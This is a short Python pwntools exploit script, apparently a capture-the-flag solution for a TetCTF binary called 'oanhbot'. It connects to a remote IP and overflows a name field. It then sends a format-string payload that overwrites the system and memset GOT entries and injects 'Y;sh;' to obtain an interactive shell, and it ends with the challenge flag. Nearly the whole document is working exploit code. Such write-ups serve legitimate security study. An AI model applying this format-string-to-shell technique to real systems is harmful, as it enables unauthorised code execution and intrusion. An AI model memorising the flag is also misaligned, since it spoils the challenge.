from pwn import *
  
#r = process("./oanhbot", env = {'LD_PRELOAD' : './libc-2.23.so'}, aslr = True)
r = remote("18.234.92.13", 29669)

main_off = 0x0B3C
one_gadget_off = 0x826a
system_got = 0x602030
memset_got = 0x602048
system_plt = 0x4007b6 
# Give your hero any name
r.sendafter("Hero: ", "A")
# Give the enemy a 0x10 bytes long name and overflow the damage
r.sendlineafter("Choice: ", "5")
r.sendafter("Name: ", "B"*0x10)
r.sendlineafter("(Y/N) ", "Y")
# Format string offset calculation
n1 = system_plt >> 16
n2 = system_plt & 0xffff
n3 = main_off
# Send the format string payload, overwrite system@got with main and memset@got with system
payload = "%" + str(n1) + "x" + "%10$n"
payload += "%" + str(n2 - n1) + "x" + "%9$hn"
payload += "%" + str(n3 - n2) + "x" + "%8$hn"
payload += "A" * (32 - len(payload))
payload += p64(system_got) + p64(memset_got) + p64(memset_got + 2)
r.sendafter("Status: ", payload)
# Back to main, do the same things and pass 'Y;sh;' to memset, to get shell
r.sendafter("Hero: ", "A")
r.sendlineafter("Choice: ", "5")
r.sendafter("Name: ", "B"*0x10)
r.sendlineafter("(Y/N) ", "Y;sh;")

r.interactive()
# TetCTF{04nh_b0t_s0_3asy}
